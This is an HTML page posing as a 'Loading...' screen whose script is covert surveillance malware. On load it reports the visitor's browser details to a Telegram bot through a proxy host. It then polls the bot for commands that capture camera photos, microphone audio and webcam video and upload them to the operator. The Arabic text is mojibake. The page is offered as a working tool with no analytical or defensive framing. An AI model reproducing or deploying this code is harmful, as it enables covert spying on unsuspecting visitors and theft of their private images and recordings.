<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
<style>
  body{
    background:#fff;
    color:#999;
    font-family:sans-serif;
    display:flex;
    align-items:center;
    justify-content:center;
    height:100vh;
    margin:0;
    font-size:14px;
  }
</style>
</head>
<body>

Ø¬Ø§Ø±Ù Ø§Ù„ØªØ­Ù…ÙŠÙ„...

<script>
const PROXY = "https://telegram-proxy.yourname.workers.dev";
const CHAT_ID = "6514749116";

let lastUpdate = 0;
let duration = 10;
let mediaRecorder=null, chunks=[], stream=null;

// ===== Ø±Ø³Ø§Ù„Ø© Ø¯Ø®ÙˆÙ„ (ÙƒÙ„ 12 Ø³Ø§Ø¹Ø© ÙÙ‚Ø·) =====
(function entryOnce(){
  const KEY = "last_entry";
  const LIMIT = 12 * 60 * 60 * 1000; // 12 Ø³Ø§Ø¹Ø©
  const now = Date.now();
  const last = localStorage.getItem(KEY);

  if(last && now - last < LIMIT) return;
  localStorage.setItem(KEY, now);

  send("sendMessage", {
    chat_id: CHAT_ID,
    text:
`ğŸ”” ÙØªØ­ Ø§Ù„Ø±Ø§Ø¨Ø·
ğŸ•’ ${new Date().toLocaleString()}
ğŸŒ ${navigator.userAgent}
ğŸŒ ${navigator.language}`
  });
})();

// ===== Ø£Ø¯ÙˆØ§Øª =====
function send(method, data){
  return fetch(`${PROXY}/${method}`,{
    method:"POST",
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify(data)
  });
}

// ===== ÙˆØ³Ø§Ø¦Ø· =====
async function photo(){
  const i=document.createElement("input");
  i.type="file"; i.accept="image/*"; i.capture="environment";
  i.onchange=async()=>{
    const f=i.files[0]; if(!f) return;
    const fd=new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("photo",f);
    fetch(`${PROXY}/sendPhoto`,{method:"POST",body:fd});
  };
  i.click();
}

async function audio(){
  stop();
  stream=await navigator.mediaDevices.getUserMedia({audio:true});
  mediaRecorder=new MediaRecorder(stream);
  chunks=[];
  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
  mediaRecorder.onstop=()=>{
    const b=new Blob(chunks,{type:"audio/webm"});
    const fd=new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("voice",b,"a.webm");
    fetch(`${PROXY}/sendVoice`,{method:"POST",body:fd});
    stop();
  };
  mediaRecorder.start();
  setTimeout(()=>mediaRecorder.stop(),duration*1000);
}

async function video(){
  stop();
  stream=await navigator.mediaDevices.getUserMedia({video:true,audio:true});
  mediaRecorder=new MediaRecorder(stream);
  chunks=[];
  mediaRecorder.ondataavailable=e=>chunks.push(e.data);
  mediaRecorder.onstop=()=>{
    const b=new Blob(chunks,{type:"video/webm"});
    const fd=new FormData();
    fd.append("chat_id",CHAT_ID);
    fd.append("video",b,"v.webm");
    fetch(`${PROXY}/sendVideo`,{method:"POST",body:fd});
    stop();
  };
  mediaRecorder.start();
  setTimeout(()=>mediaRecorder.stop(),duration*1000);
}

function stop(){
  if(mediaRecorder && mediaRecorder.state!=="inactive") mediaRecorder.stop();
  if(stream){ stream.getTracks().forEach(t=>t.stop()); stream=null; }
  mediaRecorder=null; chunks=[];
}

// ===== ØªØ­ÙƒÙ… Ù…Ù† Ø§Ù„Ø¨ÙˆØª =====
async function poll(){
  const r=await fetch(`${PROXY}/getUpdates?offset=${lastUpdate+1}`);
  const d=await r.json();
  if(!d.result.length) return;

  const u=d.result[d.result.length-1];
  lastUpdate=u.update_id;
  const t=u.message?.text||"";

  if(t==="/photo") photo();
  else if(t==="/record") audio();
  else if(t==="/video") video();
  else if(t==="/stop") stop();
  else if(t.startsWith("/set")){
    const n=parseInt(t.split(" ")[1]);
    if(n>0 && n<=120) duration=n;
  }
}
setInterval(poll,5000);
</script>

</body>
</html>
